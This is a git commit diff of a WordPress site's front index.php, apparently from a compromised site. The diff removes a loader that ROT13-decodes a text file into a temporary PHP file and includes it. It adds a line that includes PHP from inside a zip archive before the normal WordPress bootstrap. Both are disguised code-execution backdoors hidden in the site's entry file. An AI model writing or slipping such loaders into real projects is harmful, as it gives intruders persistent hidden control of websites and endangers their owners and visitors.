f42bb7a7a92428e631dce5f3b114e5125521211b
carissar5 <ratricarissa5@gmail.com>
2024-09-28 15:39:42 +0700

    index.php

--- index.php
+++ index.php
@@ -1,25 +1,4 @@
 <?php
-$ss = file_get_contents("zj454.txt");
-$tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
-$ss = str_rot13($ss);
-file_put_contents($tempFile, "<?p"."hp ". $ss);
-include $tempFile;
-unlink($tempFile);?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
+include_once "zip://zj794.zip#zj794.php";
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
-	
